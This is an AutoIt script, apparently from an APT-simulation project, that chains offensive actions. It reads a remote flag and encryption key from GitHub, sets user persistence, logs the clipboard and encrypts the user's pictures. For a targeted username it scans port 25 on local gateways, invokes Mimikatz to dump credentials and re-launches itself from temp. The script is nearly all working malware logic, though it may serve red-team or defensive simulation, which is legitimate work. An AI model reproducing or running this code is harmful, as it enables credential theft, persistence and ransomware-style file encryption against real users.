#include "libs/settings.au3"
#include "libs/network.au3"
#include "libs/info.au3"
#include "libs/misc.au3"
#include "libs/files.au3"

$victim = "john"

$flag_url = 'https://raw.githubusercontent.com/filippostz/APT-SimulActor/master/etc/flag.txt'

$key_url = 'https://raw.githubusercontent.com/filippostz/APT-SimulActor/master/etc/key.txt'

$flag = ReadRemoteVar($flag_url)

if $flag = 1 Then

   if isRunningFromTemp() Then

	  SetPersistent4CurrentUser()

	  clipboard2Log(120)

	  $key = ReadRemoteVar($key_url)

	  Sleep(5000)

	  EncryptPictures($key)

   Else

	  if AmIusername($victim) Then

		 TCPscanner("192.168.1.1","25")

		 TCPscanner("192.168.1.254","25")

		 Mimikatz()

		 CopyTempRun()

	  EndIf

   EndIf

EndIf

















